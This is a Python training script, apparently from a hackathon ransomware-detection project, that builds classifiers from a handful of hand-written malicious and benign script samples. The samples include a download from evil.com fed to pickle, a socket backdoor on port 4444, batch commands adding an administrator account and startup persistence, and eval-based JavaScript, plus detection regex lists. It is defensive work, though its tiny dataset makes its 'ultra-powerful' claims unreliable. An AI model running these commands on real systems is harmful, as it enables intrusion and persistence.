"""
Entraînement des modèles ultra-puissants
RansomGuard AI - Hackathon Togo IT Days 2025
"""

import os
import numpy as np
import pandas as pd
import joblib
import logging
from sklearn.ensemble import RandomForestClassifier, GradientBoostingClassifier
from sklearn.model_selection import train_test_split
from sklearn.preprocessing import StandardScaler
from sklearn.metrics import classification_report, confusion_matrix
import re
import hashlib
from typing import List, Dict

logger = logging.getLogger(__name__)

class UltraModelTrainer:
    """Entraîneur de modèles ultra-puissants"""
    
    def __init__(self):
        self.models = {}
        self.scaler = StandardScaler()
        
    def create_training_data(self):
        """Créer des données d'entraînement synthétiques"""
        logger.info("🔧 Création des données d'entraînement...")
        
        training_data = []
        
        # 1. Scripts Python malveillants
        python_malware_samples = [
            {
                'content': '''
import subprocess
import base64
import os

# Malware Python
encoded = "ZWNobyAiaGVsbG8i"
decoded = base64.b64decode(encoded)
subprocess.call(decoded, shell=True)
os.system("whoami")
eval("print('malware')")
''',
                'label': 1,
                'type': 'python'
            },
            {
                'content': '''
import requests
import pickle
import marshal

# Plus de malware
url = "http://evil.com/payload"
response = requests.get(url)
pickle.loads(response.content)
marshal.loads(response.content)
''',
                'label': 1,
                'type': 'python'
            },
            {
                'content': '''
import socket
import threading
import ctypes

# Backdoor
s = socket.socket()
s.bind(('0.0.0.0', 4444))
s.listen(1)
conn, addr = s.accept()
''',
                'label': 1,
                'type': 'python'
            }
        ]
        
        # 2. Scripts batch malveillants
        batch_malware_samples = [
            {
                'content': '''
@echo off
net user hacker password /add
net localgroup administrators hacker /add
reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "malware" /t REG_SZ /d "C:\\malware.exe" /f
''',
                'label': 1,
                'type': 'batch'
            },
            {
                'content': '''
@echo off
schtasks /create /tn "malware" /tr "C:\\malware.exe" /sc onstart /ru system
at 12:00 /every:m,t,w,th,f,sa,su malware.exe
''',
                'label': 1,
                'type': 'batch'
            }
        ]
        
        # 3. Scripts JavaScript malveillants
        js_malware_samples = [
            {
                'content': '''
// Malware JavaScript
eval("console.log('malware')");
Function("alert('malware')")();
setTimeout(function() {
    eval("document.write('malware')");
}, 1000);
''',
                'label': 1,
                'type': 'javascript'
            },
            {
                'content': '''
// Plus de malware JS
var encoded = "YWxlcnQoJ21hbHdhcmUnKQ==";
eval(atob(encoded));
new Function("alert('malware')")();
''',
                'label': 1,
                'type': 'javascript'
            }
        ]
        
        # 4. Scripts légitimes (bénins)
        benign_samples = [
            {
                'content': '''
import os
import sys

def main():
    print("Hello World")
    return 0

if __name__ == "__main__":
    main()
''',
                'label': 0,
                'type': 'python'
            },
            {
                'content': '''
@echo off
echo Hello World
pause
''',
                'label': 0,
                'type': 'batch'
            },
            {
                'content': '''
// Script légitime
console.log("Hello World");
function greet() {
    alert("Hello");
}
''',
                'label': 0,
                'type': 'javascript'
            }
        ]
        
        # Combiner tous les échantillons
        all_samples = python_malware_samples + batch_malware_samples + js_malware_samples + benign_samples
        
        # Extraire les caractéristiques
        for sample in all_samples:
            features = self._extract_features(sample['content'], sample['type'])
            training_data.append({
                'features': features,
                'label': sample['label'],
                'type': sample['type']
            })
        
        logger.info(f"✅ {len(training_data)} échantillons créés")
        return training_data
    
    def _extract_features(self, content: str, file_type: str) -> List[float]:
        """Extraire les caractéristiques d'un fichier"""
        features = []
        
        # 1. Caractéristiques de base
        features.append(len(content))  # Taille du fichier
        features.append(len(content.split('\n')))  # Nombre de lignes
        features.append(len(content.split()))  # Nombre de mots
        
        # 2. Caractéristiques de complexité
        features.append(len(re.findall(r'[A-Za-z0-9+/]{20,}={0,2}', content)))  # Base64
        features.append(len(re.findall(r'\\x[0-9a-fA-F]{2}', content)))  # Hex
        features.append(len(re.findall(r'%[0-9a-fA-F]{2}', content)))  # URL encoding
        
        # 3. Caractéristiques de patterns malveillants
        malware_patterns = {
            'python': [r'exec\s*\(', r'eval\s*\(', r'subprocess', r'os\.system', r'base64', r'pickle'],
            'batch': [r'net\s+user', r'reg\s+add', r'schtasks', r'at\s+', r'sc\s+create'],
            'javascript': [r'eval\s*\(', r'Function\s*\(', r'setTimeout', r'atob\s*\(', r'btoa\s*\(']
        }
        
        patterns = malware_patterns.get(file_type, [])
        pattern_count = sum(len(re.findall(pattern, content, re.IGNORECASE)) for pattern in patterns)
        features.append(pattern_count)
        
        # 4. Caractéristiques d'obfuscation
        features.append(len(re.findall(r'[A-Za-z0-9+/]{50,}={0,2}', content)))  # Longues chaînes base64
        features.append(len(re.findall(r'[0-9a-fA-F]{20,}', content)))  # Longues chaînes hex
        features.append(len(re.findall(r'\b[a-zA-Z_][a-zA-Z0-9_]*\s*=\s*[\'"][^\'"]{20,}[\'"]', content)))  # Variables suspectes
        
        # 5. Caractéristiques d'entropie
        try:
            entropy = self._calculate_entropy(content.encode())
            features.append(entropy)
        except:
            features.append(0.0)
        
        # 6. Caractéristiques de hash
        try:
            hash_value = hashlib.md5(content.encode()).hexdigest()
            features.append(int(hash_value[:8], 16))  # Premiers 8 caractères du hash
        except:
            features.append(0)
        
        return features
    
    def _calculate_entropy(self, data: bytes) -> float:
        """Calculer l'entropie"""
        if not data:
            return 0.0
        
        byte_counts = [0] * 256
        for byte in data:
            byte_counts[byte] += 1
        
        entropy = 0.0
        data_length = len(data)
        
        for count in byte_counts:
            if count > 0:
                probability = count / data_length
                entropy -= probability * np.log2(probability)
        
        return entropy
    
    def train_models(self, training_data: List[Dict]):
        """Entraîner les modèles"""
        logger.info("🚀 Entraînement des modèles ultra-puissants...")
        
        # Préparer les données
        X = np.array([sample['features'] for sample in training_data])
        y = np.array([sample['label'] for sample in training_data])
        
        # Diviser en train/test
        X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42)
        
        # Normaliser les caractéristiques
        X_train_scaled = self.scaler.fit_transform(X_train)
        X_test_scaled = self.scaler.transform(X_test)
        
        # 1. Modèle Random Forest
        logger.info("🌲 Entraînement Random Forest...")
        rf_model = RandomForestClassifier(n_estimators=200, max_depth=10, random_state=42)
        rf_model.fit(X_train_scaled, y_train)
        
        # Évaluer
        rf_score = rf_model.score(X_test_scaled, y_test)
        logger.info(f"Random Forest Score: {rf_score:.3f}")
        
        # 2. Modèle Gradient Boosting
        logger.info("📈 Entraînement Gradient Boosting...")
        gb_model = GradientBoostingClassifier(n_estimators=100, max_depth=5, random_state=42)
        gb_model.fit(X_train_scaled, y_train)
        
        # Évaluer
        gb_score = gb_model.score(X_test_scaled, y_test)
        logger.info(f"Gradient Boosting Score: {gb_score:.3f}")
        
        # Sauvegarder les modèles
        os.makedirs('models', exist_ok=True)
        
        joblib.dump(rf_model, 'models/ultra_random_forest.pkl')
        joblib.dump(gb_model, 'models/ultra_gradient_boosting.pkl')
        joblib.dump(self.scaler, 'models/ultra_scaler.pkl')
        
        logger.info("✅ Modèles ultra-puissants sauvegardés!")
        
        # Retourner les modèles
        self.models['random_forest'] = rf_model
        self.models['gradient_boosting'] = gb_model
        
        return {
            'random_forest_score': rf_score,
            'gradient_boosting_score': gb_score,
            'models': self.models,
            'scaler': self.scaler
        }

def main():
    """Fonction principale"""
    logger.info("🚀 Démarrage de l'entraînement ultra-puissant...")
    
    trainer = UltraModelTrainer()
    
    # Créer les données d'entraînement
    training_data = trainer.create_training_data()
    
    # Entraîner les modèles
    results = trainer.train_models(training_data)
    
    logger.info("🎯 Entraînement terminé!")
    logger.info(f"Random Forest Score: {results['random_forest_score']:.3f}")
    logger.info(f"Gradient Boosting Score: {results['gradient_boosting_score']:.3f}")

if __name__ == "__main__":
    main()
